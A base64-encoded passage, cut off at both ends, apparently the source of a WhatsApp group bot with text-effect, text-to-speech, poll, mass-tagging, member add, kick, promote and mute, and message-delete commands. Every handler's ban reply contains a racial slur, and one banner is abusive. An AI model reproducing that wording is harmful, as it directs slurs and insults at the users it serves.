zoKY2FzZSAnZWZmZWN0Y2xvdWRzJzoKY2FzZSAnYmxhY2twaW5rbG9nbyc6CmNhc2UgJ2dyYWRpZW50dGV4dCc6CmNhc2UgJ3N1bW1lcmJlYWNoJzoKY2FzZSAnbHV4dXJ5Z29sZCc6CmNhc2UgJ211bHRpY29sb3JlZG5lb24nOgpjYXNlICdzYW5kc3VtbWVyJzoKY2FzZSAnZ2FsYXh5d2FsbHBhcGVyJzoKY2FzZSAnMTkxN3N0eWxlJzoKY2FzZSAnbWFraW5nbmVvbic6CmNhc2UgJ3JveWFsdGV4dCc6CmNhc2UgJ2ZyZWVjcmVhdGUnOgpjYXNlICdnYWxheHlzdHlsZSc6CmNhc2UgJ2xpZ2h0ZWZmZWN0cyc6ewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKaWYgKCFxKSByZXR1cm4gcmVwbHkoYEV4YW1wbGUgOiAke3ByZWZpeCtjb21tYW5kfSBSaWNoaWUgYCkgCnJlcGx5Z2MobWVzcy53YWl0KQpsZXQgbGluawppZiAoL2dsaXRjaHRleHQvLnRlc3QoY29tbWFuZCkpIGxpbmsgPSAnaHR0cHM6Ly9lbi5lcGhvdG8zNjAuY29tL2NyZWF0ZS1kaWdpdGFsLWdsaXRjaC10ZXh0LWVmZmVjdHMtb25saW5lLTc2Ny5odG1sJwppZiAoL3dyaXRldGV4dC8udGVzdChjb21tYW5kKSkgbGluayA9ICdodHRwczovL2VuLmVwaG90bzM2MC5jb20vd3JpdGUtdGV4dC1vbi13ZXQtZ2xhc3Mtb25saW5lLTU4OS5odG1sJwppZiAoL2FkdmFuY2VkZ2xvdy8udGVzdChjb21tYW5kKSkgbGluayA9ICdodHRwczovL2VuLmVwaG90bzM2MC5jb20vYWR2YW5jZWQtZ2xvdy1lZmZlY3RzLTc0Lmh0bWwnCmlmICgvdHlwb2dyYXBoeXRleHQvLnRlc3QoY29tbWFuZCkpIGxpbmsgPSAnaHR0cHM6Ly9lbi5lcGhvdG8zNjAuY29tL2NyZWF0ZS10eXBvZ3JhcGh5LXRleHQtZWZmZWN0LW9uLXBhdmVtZW50LW9ubGluZS03NzQuaHRtbCcKaWYgKC9waXhlbGdsaXRjaC8udGVzdChjb21tYW5kKSkgbGluayA9ICdodHRwczovL2VuLmVwaG90bzM2MC5jb20vY3JlYXRlLXBpeGVsLWdsaXRjaC10ZXh0LWVmZmVjdC1vbmxpbmUtNzY5Lmh0bWwnCmlmICgvbmVvbmdsaXRjaC8udGVzdChjb21tYW5kKSkgbGluayA9ICdodHRwczovL2VuLmVwaG90bzM2MC5jb20vY3JlYXRlLWltcHJlc3NpdmUtbmVvbi1nbGl0Y2gtdGV4dC1lZmZlY3RzLW9ubGluZS03NjguaHRtbCcKaWYgKC9mbGFndGV4dC8udGVzdChjb21tYW5kKSkgbGluayA9ICdodHRwczovL2VuLmVwaG90bzM2MC5jb20vbmlnZXJpYS0zZC1mbGFnLXRleHQtZWZmZWN0LW9ubGluZS1mcmVlLTc1My5odG1sJwppZiAoL2ZsYWczZHRleHQvLnRlc3QoY29tbWFuZCkpIGxpbmsgPSAnaHR0cHM6Ly9lbi5lcGhvdG8zNjAuY29tL2ZyZWUtb25saW5lLWFtZXJpY2FuLWZsYWctM2QtdGV4dC1lZmZlY3QtZ2VuZXJhdG9yLTcyNS5odG1sJwppZiAoL2RlbGV0aW5ndGV4dC8udGVzdChjb21tYW5kKSkgbGluayA9ICdodHRwczovL2VuLmVwaG90bzM2MC5jb20vY3JlYXRlLWVyYXNlci1kZWxldGluZy10ZXh0LWVmZmVjdC1vbmxpbmUtNzE3Lmh0bWwnCmlmICgvYmxhY2twaW5rc3R5bGUvLnRlc3QoY29tbWFuZCkpIGxpbmsgPSAnaHR0cHM6Ly9lbi5lcGhvdG8zNjAuY29tL29ubGluZS1ibGFja3Bpbmstc3R5bGUtbG9nby1tYWtlci1lZmZlY3QtNzExLmh0bWwnCmlmICgvZ2xvd2luZ3RleHQvLnRlc3QoY29tbWFuZCkpIGxpbmsgPSAnaHR0cHM6Ly9lbi5lcGhvdG8zNjAuY29tL2NyZWF0ZS1nbG93aW5nLXRleHQtZWZmZWN0cy1vbmxpbmUtNzA2Lmh0bWwnCmlmICgvdW5kZXJ3YXRlcnRleHQvLnRlc3QoY29tbWFuZCkpIGxpbmsgPSAnaHR0cHM6Ly9lbi5lcGhvdG8zNjAuY29tLzNkLXVuZGVyd2F0ZXItdGV4dC1lZmZlY3Qtb25saW5lLTY4Mi5odG1sJwppZiAoL2xvZ29tYWtlci8udGVzdChjb21tYW5kKSkgbGluayA9ICdodHRwczovL2VuLmVwaG90bzM2MC5jb20vZnJlZS1iZWFyLWxvZ28tbWFrZXItb25saW5lLTY3My5odG1sJwppZiAoL2NhcnRvb25zdHlsZS8udGVzdChjb21tYW5kKSkgbGluayA9ICdodHRwczovL2VuLmVwaG90bzM2MC5jb20vY3JlYXRlLWEtY2FydG9vbi1zdHlsZS1ncmFmZml0aS10ZXh0LWVmZmVjdC1vbmxpbmUtNjY4Lmh0bWwnCmlmICgvcGFwZXJjdXRzdHlsZS8udGVzdChjb21tYW5kKSkgbGluayA9ICdodHRwczovL2VuLmVwaG90bzM2MC5jb20vbXVsdGljb2xvci0zZC1wYXBlci1jdXQtc3R5bGUtdGV4dC1lZmZlY3QtNjU4Lmh0bWwnCmlmICgvd2F0ZXJjb2xvcnRleHQvLnRlc3QoY29tbWFuZCkpIGxpbmsgPSAnaHR0cHM6Ly9lbi5lcGhvdG8zNjAuY29tL2NyZWF0ZS1hLXdhdGVyY29sb3ItdGV4dC1lZmZlY3Qtb25saW5lLTY1NS5odG1sJwppZiAoL2VmZmVjdGNsb3Vkcy8udGVzdChjb21tYW5kKSkgbGluayA9ICdodHRwczovL2VuLmVwaG90bzM2MC5jb20vd3JpdGUtdGV4dC1lZmZlY3QtY2xvdWRzLWluLXRoZS1za3ktb25saW5lLTYxOS5odG1sJwppZiAoL2JsYWNrcGlua2xvZ28vLnRlc3QoY29tbWFuZCkpIGxpbmsgPSAnaHR0cHM6Ly9lbi5lcGhvdG8zNjAuY29tL2NyZWF0ZS1ibGFja3BpbmstbG9nby1vbmxpbmUtZnJlZS02MDcuaHRtbCcKaWYgKC9ncmFkaWVudHRleHQvLnRlc3QoY29tbWFuZCkpIGxpbmsgPSAnaHR0cHM6Ly9lbi5lcGhvdG8zNjAuY29tL2NyZWF0ZS0zZC1ncmFkaWVudC10ZXh0LWVmZmVjdC1vbmxpbmUtNjAwLmh0bWwnCmlmICgvc3VtbWVyYmVhY2gvLnRlc3QoY29tbWFuZCkpIGxpbmsgPSAnaHR0cHM6Ly9lbi5lcGhvdG8zNjAuY29tL3dyaXRlLWluLXNhbmQtc3VtbWVyLWJlYWNoLW9ubGluZS1mcmVlLTU5NS5odG1sJwppZiAoL2x1eHVyeWdvbGQvLnRlc3QoY29tbWFuZCkpIGxpbmsgPSAnaHR0cHM6Ly9lbi5lcGhvdG8zNjAuY29tL2NyZWF0ZS1hLWx1eHVyeS1nb2xkLXRleHQtZWZmZWN0LW9ubGluZS01OTQuaHRtbCcKaWYgKC9tdWx0aWNvbG9yZWRuZW9uLy50ZXN0KGNvbW1hbmQpKSBsaW5rID0gJ2h0dHBzOi8vZW4uZXBob3RvMzYwLmNvbS9jcmVhdGUtbXVsdGljb2xvcmVkLW5lb24tbGlnaHQtc2lnbmF0dXJlcy01OTEuaHRtbCcKaWYgKC9zYW5kc3VtbWVyLy50ZXN0KGNvbW1hbmQpKSBsaW5rID0gJ2h0dHBzOi8vZW4uZXBob3RvMzYwLmNvbS93cml0ZS1pbi1zYW5kLXN1bW1lci1iZWFjaC1vbmxpbmUtNTc2Lmh0bWwnCmlmICgvZ2FsYXh5d2FsbHBhcGVyLy50ZXN0KGNvbW1hbmQpKSBsaW5rID0gJ2h0dHBzOi8vZW4uZXBob3RvMzYwLmNvbS9jcmVhdGUtZ2FsYXh5LXdhbGxwYXBlci1tb2JpbGUtb25saW5lLTUyOC5odG1sJwppZiAoLzE5MTdzdHlsZS8udGVzdChjb21tYW5kKSkgbGluayA9ICdodHRwczovL2VuLmVwaG90bzM2MC5jb20vMTkxNy1zdHlsZS10ZXh0LWVmZmVjdC01MjMuaHRtbCcKaWYgKC9tYWtpbmduZW9uLy50ZXN0KGNvbW1hbmQpKSBsaW5rID0gJ2h0dHBzOi8vZW4uZXBob3RvMzYwLmNvbS9tYWtpbmctbmVvbi1saWdodC10ZXh0LWVmZmVjdC13aXRoLWdhbGF4eS1zdHlsZS01MjEuaHRtbCcKaWYgKC9yb3lhbHRleHQvLnRlc3QoY29tbWFuZCkpIGxpbmsgPSAnaHR0cHM6Ly9lbi5lcGhvdG8zNjAuY29tL3JveWFsLXRleHQtZWZmZWN0LW9ubGluZS1mcmVlLTQ3MS5odG1sJwppZiAoL2ZyZWVjcmVhdGUvLnRlc3QoY29tbWFuZCkpIGxpbmsgPSAnaHR0cHM6Ly9lbi5lcGhvdG8zNjAuY29tL2ZyZWUtY3JlYXRlLWEtM2QtaG9sb2dyYW0tdGV4dC1lZmZlY3QtNDQxLmh0bWwnCmlmICgvZ2FsYXh5c3R5bGUvLnRlc3QoY29tbWFuZCkpIGxpbmsgPSAnaHR0cHM6Ly9lbi5lcGhvdG8zNjAuY29tL2NyZWF0ZS1nYWxheHktc3R5bGUtZnJlZS1uYW1lLWxvZ28tNDM4Lmh0bWwnCmlmICgvbGlnaHRlZmZlY3RzLy50ZXN0KGNvbW1hbmQpKSBsaW5rID0gJ2h0dHBzOi8vZW4uZXBob3RvMzYwLmNvbS9jcmVhdGUtbGlnaHQtZWZmZWN0cy1ncmVlbi1uZW9uLW9ubGluZS00MjkuaHRtbCcKbGV0IGhhbGR3aGQgPSBhd2FpdCBlcGhvdG8obGluaywgcSkKcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsgaW1hZ2U6IHsgdXJsOiBoYWxkd2hkIH0sIGNhcHRpb246IGAke21lc3Muc3VjY2Vzc31gIH0sIHsgcXVvdGVkOiBtIH0pCn0KYnJlYWs7CmNhc2UgJ3NheSc6IGNhc2UgJ3R0cyc6IGNhc2UgJ2d0dHMnOnsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CmlmICghdGV4dCkgcmV0dXJuIHJlcGx5KCdXaGVyZSBpcyB0aGUgdGV4dD8nKQogICAgICAgICAgICBsZXQgdGV4dHR0cyA9IHRleHQKICAgICAgICAgICAgY29uc3QgeGVvbnJsID0gZ29vZ2xlVFRTLmdldEF1ZGlvVXJsKHRleHR0dHMsIHsKICAgICAgICAgICAgICAgIGxhbmc6ICJlbiIsCiAgICAgICAgICAgICAgICBzbG93OiBmYWxzZSwKICAgICAgICAgICAgICAgIGhvc3Q6ICJodHRwczovL3RyYW5zbGF0ZS5nb29nbGUuY29tIiwKICAgICAgICAgICAgfSkKICAgICAgICAgICAgcmV0dXJuIHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7CiAgICAgICAgICAgICAgICBhdWRpbzogewogICAgICAgICAgICAgICAgICAgIHVybDogeGVvbnJsLAogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIG1pbWV0eXBlOiAnYXVkaW8vbXA0JywKICAgICAgICAgICAgICAgIHB0dDogdHJ1ZSwKICAgICAgICAgICAgICAgIGZpbGVOYW1lOiBgJHt0ZXh0fS5tcDNgLAogICAgICAgICAgICB9LCB7CiAgICAgICAgICAgICAgICBxdW90ZWQ6IG0sCiAgICAgICAgICAgIH0pCiAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgICAgIApjYXNlICdqaWQnOnsKICAgICAgICAgICAgcmVwbHkoZnJvbSkKICAgICAgICAgICB9CiAgICAgICAgICBicmVhazsKICAgICAgICAgIGNhc2UgJ2dyb3VwamlkJzp7CiAgICAgICAgICBpZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICAgICAgICBjb25zdCBncm91cE1ldGFkYXRhID0gbS5pc0dyb3VwID8gYXdhaXQgcmljaC5ncm91cE1ldGFkYXRhKG0uY2hhdCkuY2F0Y2goKGUpID0+IHt9KSA6ICIiCgkJY29uc3QgcGFydGljaXBhbnRzID0gbS5pc0dyb3VwID8gYXdhaXQgZ3JvdXBNZXRhZGF0YS5wYXJ0aWNpcGFudHMgOiAiIgogICAgbGV0IHRleHR0ID0gYF9IZXJlIGlzIGppZCBhZGRyZXNzIG9mIGFsbCB1c2VycyBvZl9cbiAqLSAke2dyb3VwTWV0YWRhdGEuc3ViamVjdH0qXG5cbmAKICAgIGZvciAobGV0IG1lbSBvZiBwYXJ0aWNpcGFudHMpIHsKICAgICAgICAgICAgdGV4dHQgKz0gYCR7dGhlbWVlbW9qaX0gJHttZW0uaWR9XG5gCiAgICAgICAgfQogICAgICByZXBseSh0ZXh0dCkKICAgIH0KICAgIGJyZWFrOwogICAgY2FzZSAncG9sbCc6IHsKICAgIGlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogICAgICAgICAgICBsZXQgW3BvbGwsIG9wdF0gPSB0ZXh0LnNwbGl0KCJ8IikKICAgICAgICAgICAgaWYgKHRleHQuc3BsaXQoInwiKSA8IDIpCnJldHVybiBhd2FpdCByZXBseSgKYFN0YXRlIHRoZSBxdWVzdGlvbiBhbmQgYXQgbGVhc3QgMiBvcHRpb25zXG5FeGFtcGxlOiAke3ByZWZpeH1wb2xsIFdobyBpcyB0aGUgYmVzdCBhZG1pbj98eWVzLG5vLCBtYXliZS4uLmAKKQogICAgICAgICAgICBsZXQgb3B0aW9ucyA9IFtdCiAgICAgICAgICAgIGZvciAobGV0IGkgb2Ygb3B0LnNwbGl0KCcsJykpIHsKb3B0aW9ucy5wdXNoKGkpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsKcG9sbDogewpuYW1lOiBwb2xsLAp2YWx1ZXM6IG9wdGlvbnMKfQogICAgICAgICAgICB9KQogICAgICAgIH0KICAgICAgICBicmVhazsKY2FzZSd0YWdhbGwnOnsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CmlmICghaXNDcmVhdG9yKSByZXR1cm4gbS5yZXBseSgiYGBgZm9yIE93bmVyIG9ubHlgYGAuIik7CiAgICAgICAgaWYgKCFtLmlzR3JvdXApIHJldHVybiByZXBseShtZXNzLmdyb3VwKTsKICAgICAgICBjb25zdCB0ZXh0TWVzc2FnZSA9IGFyZ3Muam9pbigiICIpIHx8ICJSSUNISUUg8J+YnSI7CiAgICAgICAgbGV0IHRla3MgPSBgXGBGVUNLIFlPVSDwn5Sq8J+koSB0YWdhbGxcYCA6XG4+ICoke3RleHRNZXNzYWdlfSpcblxuYDsKCiAgICAgICAgY29uc3QgZ3JvdXBNZXRhZGF0YSA9IGF3YWl0IHJpY2guZ3JvdXBNZXRhZGF0YShtLmNoYXQpOwogICAgICAgIGNvbnN0IHBhcnRpY2lwYW50cyA9IGdyb3VwTWV0YWRhdGEucGFydGljaXBhbnRzOwoKICAgICAgICBmb3IgKGxldCBtZW0gb2YgcGFydGljaXBhbnRzKSB7CiAgICAgICAgICAgIHRla3MgKz0gYEAke21lbS5pZC5zcGxpdCgiQCIpWzBdfVxuYDsKICAgICAgICB9CgogICAgICAgIHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7CiAgICAgICAgICAgIHRleHQ6IHRla3MsCiAgICAgICAgICAgIG1lbnRpb25zOiBwYXJ0aWNpcGFudHMubWFwKChhKSA9PiBhLmlkKQogICAgICAgIH0sIHsgcXVvdGVkOiBtIH0pOwogICAgICB9CiAgICAgIGJyZWFrOwpjYXNlICdoaWRldGFnJzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKaWYgKCFpc0NyZWF0b3IpIHJldHVybiBtLnJlcGx5KCJgYGBmb3IgT3duZXIgb25seWBgYC4iKTsKcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsgdGV4dCA6IHEgPyBxIDogJycgLCBtZW50aW9uczogcGFydGljaXBhbnRzLm1hcChhID0+IGEuaWQpfSwgeyBxdW90ZWQ6IG0gfSkKfQpicmVhazsKY2FzZSAncHJvbW90ZSc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CmlmICghbS5pc0dyb3VwKSByZXR1cm4gcmVwbHkobWVzcy5vbmx5Lmdyb3VwKQppZiAoIWlzQWRtaW5zICkgcmV0dXJuIHJlcGx5KCd5b3VyIG5vdCBhbiBhZG1pbiEhJykKaWYgKCFpc0JvdEFkbWlucykgcmV0dXJuIHJlcGx5KCdfQm90IGlzIG5vdCB5ZXQgYWRtaW5fJykKbGV0IHVzZXJzID0gbS5tZW50aW9uZWRKaWRbMF0gPyBtLm1lbnRpb25lZEppZFswXSA6IG0ucXVvdGVkID8gbS5xdW90ZWQuc2VuZGVyIDogdGV4dC5yZXBsYWNlKC9bXjAtOV0vZywgJycpKydAcy53aGF0c2FwcC5uZXQnCmF3YWl0IHJpY2guZ3JvdXBQYXJ0aWNpcGFudHNVcGRhdGUobS5jaGF0LCBbdXNlcnNdLCAncHJvbW90ZScpCmF3YWl0IHJlcGx5KGBEb25lYCkKfQpicmVhawpjYXNlICdkZW1vdGUnOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwppZiAoIWlzQWRtaW5zKSByZXR1cm4gcmVwbHkoJ2ZvciBhZG1pbiBvbmx5ISEnKQppZiAoIWlzQm90QWRtaW5zKSByZXR1cm4gcmVwbHkoJ19ib3QgaXMgbm90IHlldCBhZG1pbl8nKQpsZXQgdXNlcnMgPSBtLm1lbnRpb25lZEppZFswXSA/IG0ubWVudGlvbmVkSmlkWzBdIDogbS5xdW90ZWQgPyBtLnF1b3RlZC5zZW5kZXIgOiB0ZXh0LnJlcGxhY2UoL1teMC05XS9nLCAnJykrJ0BzLndoYXRzYXBwLm5ldCcKYXdhaXQgcmljaC5ncm91cFBhcnRpY2lwYW50c1VwZGF0ZShtLmNoYXQsIFt1c2Vyc10sICdkZW1vdGUnKQphd2FpdCByZXBseShgRG9uZWApCn0KYnJlYWs7CmNhc2UgJ211dGUnOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogICAgaWYgKCFtLmlzR3JvdXApIHJldHVybiByZXBseSgnYGBgVGhpcyBjb21tYW5kIGNhbiBvbmx5IGJlIHVzZWQgaW4gZ3JvdXBzYGBgLicpOwogICAgaWYgKCFpc0FkbWlucykgcmV0dXJuIHJlcGx5KCdgYGAgT25seSBhZG1pbnMgY2FuIHVzZSB0aGlzIGNvbW1hbmQhYGBgJyk7CiAgICBpZiAoIWlzQm90QWRtaW5zKSByZXR1cm4gcmVwbHkoJ2BgYCBJIG5lZWQgYWRtaW4gcHJpdmlsZWdlcyB0byBtdXRlIHRoZSBncm91cC5gYGAnKTsKCiAgICB0cnkgewogICAgICAgIGF3YWl0IHJpY2guZ3JvdXBTZXR0aW5nVXBkYXRlKG0uY2hhdCwgJ2Fubm91bmNlbWVudCcpOyAvLyBNdXRlIGdyb3VwCiAgICAgICAgcmVwbHkoJ2BgYCpHcm91cCBoYXMgYmVlbiBtdXRlZC4qXG5Pbmx5IGFkbWlucyBjYW4gc2VuZCBtZXNzYWdlcyBub3cuJyk7CiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIGNvbnNvbGUuZXJyb3IoZXJyb3IpOwogICAgICAgIHJlcGx5KCdgYGAgRmFpbGVkIHRvIG11dGUgdGhlIGdyb3VwLiBQbGVhc2UgdHJ5IGFnYWluLmBgYCcpOwogICAgfQp9CmJyZWFrOwpjYXNlICd1bm11dGUnOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogICAgaWYgKCFtLmlzR3JvdXApIHJldHVybiByZXBseSgnYGBgVGhpcyBjb21tYW5kIGNhbiBvbmx5IGJlIHVzZWQgaW4gZ3JvdXBzYGBgLicpOwogICAgaWYgKCFpc0FkbWlucykgcmV0dXJuIHJlcGx5KCdgYGBPbmx5IGFkbWlucyBjYW4gdXNlIHRoaXMgY29tbWFuZCFgYGAnKTsKICAgIGlmICghaXNCb3RBZG1pbnMpIHJldHVybiByZXBseSgnYGBgSSBuZWVkIGFkbWluIHByaXZpbGVnZXMgdG8gdW5tdXRlIHRoZSBncm91cGBgYC4nKTsKCiAgICB0cnkgewogICAgICAgIGF3YWl0IHJpY2guZ3JvdXBTZXR0aW5nVXBkYXRlKG0uY2hhdCwgJ25vdF9hbm5vdW5jZW1lbnQnKTsgLy8gVW5tdXRlIGdyb3VwCiAgICAgICAgcmVwbHkoJ2BgYEdyb3VwIGhhcyBiZWVuIHVubXV0ZWRgYGAuICpcbkV2ZXJ5b25lIGNhbiBzZW5kIG1lc3NhZ2VzIG5vdyouJyk7CiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIGNvbnNvbGUuZXJyb3IoZXJyb3IpOwogICAgICAgIHJlcGx5KCdgYGAgRmFpbGVkIHRvIHVubXV0ZSB0aGUgZ3JvdXAuIFBsZWFzZSB0cnkgYWdhaW5gYGAuJyk7CiAgICB9Cn0KYnJlYWs7CgpjYXNlICdyZXF1ZXN0JzogY2FzZSAncmVwb3J0YnVnJzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICByZXBseShtZXNzLndhaXQpCglpZiAoIXRleHQpIHJldHVybiByZXBseShgRXhhbXBsZSA6ICR7CiAgICAgICAgcHJlZml4ICsgY29tbWFuZAogICAgICB9IGhpIGRldiBwbGF5IGNvbW1hbmQgaXMgbm90IHdvcmtpbmdgKQogICAgICAgICAgICB0ZXh0dCA9IGAqfCBSRVFVRVNUL0JVRyB8KmAKICAgICAgICAgICAgdGVrczEgPSBgXG5cbipVc2VyKiA6IEAkewogICBtLnNlbmRlci5zcGxpdCgiQCIpWzBdCiAgfVxuKlJlcXVlc3QvQnVnKiA6ICR7dGV4dH1gCiAgICAgICAgICAgIHRla3MyID0gYFxuXG5IaSAke3B1c2huYW1lfSwgWW91ciByZXF1ZXN0IGhhcyBiZWVuIGZvcndhcmRlZCB0byBteSBPd25lciouXG4qUGxlYXNlIHdhaXQuLi4qYAogICAgICAgICAgICBmb3IgKGxldCBpIG9mIG93bmVyKSB7CnJpY2guc2VuZE1lc3NhZ2UoaSArICJAcy53aGF0c2FwcC5uZXQiLCB7CnRleHQ6IHRleHR0ICsgdGVrczEsCm1lbnRpb25zOiBbbS5zZW5kZXJdLAp9LCB7CnF1b3RlZDogbSwKfSkKICAgICAgICAgICAgfQogICAgICAgICAgICByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgewp0ZXh0OiB0ZXh0dCArIHRla3MyICsgdGVrczEsCm1lbnRpb25zOiBbbS5zZW5kZXJdLAogICAgICAgICAgICB9LCB7CnF1b3RlZDogbSwKICAgICAgICAgICAgfSkKCiAgICAgICAgfQogICAgICAgIGJyZWFrOwpjYXNlICdsZWZ0JzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKaWYgKCFpc0NyZWF0b3IpIHJldHVybiBtLnJlcGx5KCJmb3IgT3duZXIgb25seS4iKTsKYXdhaXQgcmljaC5ncm91cExlYXZlKG0uY2hhdCkKYXdhaXQgcmVwbHkoYERvbmVgKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGJyZWFrOwpjYXNlICdhZGQnOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwppZiAoIWlzQ3JlYXRvcikgcmV0dXJuIG0ucmVwbHkoImZvciBPd25lciBvbmx5LiIpOwppZiAoIW0uaXNHcm91cCkgcmV0dXJuIHJlcGx5KG1lc3Mub25seS5ncm91cCkKaWYgKCFpc0JvdEFkbWlucykgcmV0dXJuIHJlcGx5KCdfQm90cyBNdXN0IEJlIEFkbWlucyBGaXJzdF8nKQpsZXQgdXNlcnMgPSBtLnF1b3RlZCA/IG0ucXVvdGVkLnNlbmRlciA6IHRleHQucmVwbGFjZSgvW14wLTldL2csICcnKSsnQHMud2hhdHNhcHAubmV0Jwphd2FpdCByaWNoLmdyb3VwUGFydGljaXBhbnRzVXBkYXRlKG0uY2hhdCwgW3VzZXJzXSwgJ2FkZCcpCmF3YWl0IHJlcGx5bmFubyhgRG9uZWApCn0KYnJlYWs7CmNhc2UgJ2tpY2snOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwppZiAoIW0ucXVvdGVkKSByZXR1cm4gcmVwbHkoIiBgdGFnIPCflJYgYSB1c2VyIHRvIGtpY2sgdGhlbSDwn5iIYCIpOwppZiAoIW0uaXNHcm91cCkgcmV0dXJuIHJlcGx5KG1lc3Mub25seS5ncm91cCkKaWYgKCFpc0FkbWlucyApIHJldHVybiByZXBseSgnZm9yIGFkbWlucyBvbmx5IGJybyEhJykKaWYgKCFpc0JvdEFkbWlucykgcmV0dXJuIHJlcGx5KCdfQm90IG11c3QgYmUgYWRtaW5fJykKbGV0IHVzZXJzID0gbS5tZW50aW9uZWRKaWRbMF0gPyBtLm1lbnRpb25lZEppZFswXSA6IG0ucXVvdGVkID8gbS5xdW90ZWQuc2VuZGVyIDogdGV4dC5yZXBsYWNlKC9bXjAtOV0vZywgJycpKydAcy53aGF0c2FwcC5uZXQnCmF3YWl0IHJpY2guZ3JvdXBQYXJ0aWNpcGFudHNVcGRhdGUobS5jaGF0LCBbdXNlcnNdLCAncmVtb3ZlJykKYXdhaXQgcmVwbHkoYERvbmVgKQp9CmJyZWFrOwpjYXNlICd0YWdhZG1pbic6IGNhc2UgJ2xpc3RhZG1pbic6IGNhc2UgJ2FkbWluJzp7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwppZiAoIWlzQ3JlYXRvcikgcmV0dXJuIG0ucmVwbHkoImBgYGZvciBPd25lciBvbmx5YGBgLiIpOwogICAgaWYgKCFtLmlzR3JvdXApIHJldHVybiByZXBseShtZXNzLmdyb3VwKTsKICAgIGNvbnN0IGdyb3VwQWRtaW5zID0gcGFydGljaXBhbnRzLmZpbHRlcihwID0+IHAuYWRtaW4pCiAgICBjb25zdCBsaXN0QWRtaW4gPSBncm91cEFkbWlucy5tYXAoKHYsIGkpID0+IGAke2kgKyAxfS4gQCR7di5pZC5zcGxpdCgnQCcpWzBdfWApLmpvaW4oJ1xuJykKICAgIGNvbnN0IG93bmVyID0gZ3JvdXBNZXRhZGF0YS5vd25lciB8fCBncm91cEFkbWlucy5maW5kKHAgPT4gcC5hZG1pbiA9PT0gJ3N1cGVyYWRtaW4nKT8uaWQgfHwgbS5jaGF0LnNwbGl0YC1gWzBdICsgJ0BzLndoYXRzYXBwLm5ldCcKICAgIGxldCB0ZXh0ID0gYCAgIAoqR3JvdXAgQWRtaW5zOioKJHtsaXN0QWRtaW59CmAudHJpbSgpCiAgICByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwge3RleHQgOiB0ZXh0LCBtZW50aW9uczogWy4uLmdyb3VwQWRtaW5zLm1hcCh2ID0+IHYuaWQpLCBvd25lcl0gfSwge3F1b3RlZDogbX0pCn0KYnJlYWs7ICAgICAgCmNhc2UgJ2RlbGV0ZSc6IGNhc2UgJ2RlbCc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgIGlmICghaXNDcmVhdG9yKSByZXR1cm4gcmVwbHkoImBgYGZvciBPd25lciBvbmx5YGBgLiIpOwppZiAoIW0ucXVvdGVkKSB0aHJvdyBmYWxzZQpsZXQgeyBjaGF0LCBpZCB9ID0gbS5xdW90ZWQKIHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IGRlbGV0ZTogeyByZW1vdGVKaWQ6IG0uY2hhdCwgZnJvbU1lOiB